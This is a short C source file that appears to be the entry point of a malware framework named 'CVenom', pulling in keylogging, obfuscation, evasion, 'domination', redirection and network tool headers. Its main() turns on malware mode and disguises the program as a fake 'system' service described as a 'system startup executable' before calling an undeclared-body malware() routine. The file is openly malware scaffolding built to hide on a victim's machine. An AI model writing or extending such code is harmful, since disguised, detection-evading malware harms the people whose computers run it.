#include <CVenom.h>
#include <KeyboardTools.h>
#include <ObfuscationTools.h>
#include <DominationTools.h>
#include <DiskTools.h>
#include <EvasionTools.h>
#include <SystemTools.h>
#include <RedirectionTools.h>
#include <RuntimeTools.h>
#include <UITools.h>
#include <NetworkTools.h>



	KeyboardTools		Keyboard;
	ObfuscationTools	Obfuscator;
	RuntimeTools		Runner;
	SystemTools		System;
	UITools			Ui;
	RedirectionTools	Redirector;
	NetworkTools		Network;
	DominationTools		Dominator;
	EvasionTools		Evador;
	DiskTools		Disk;


void malware();

int main(int argc, char** argv, char*** envp){
	cvinit(MALWARE_INIT);

	SetMalwareFakeService("system");
	SetMalwareFakeDescription("system startup executable");
	SetMalwareMode(ON);

	malware();

	cvexit(MALWARE_EXIT);
}
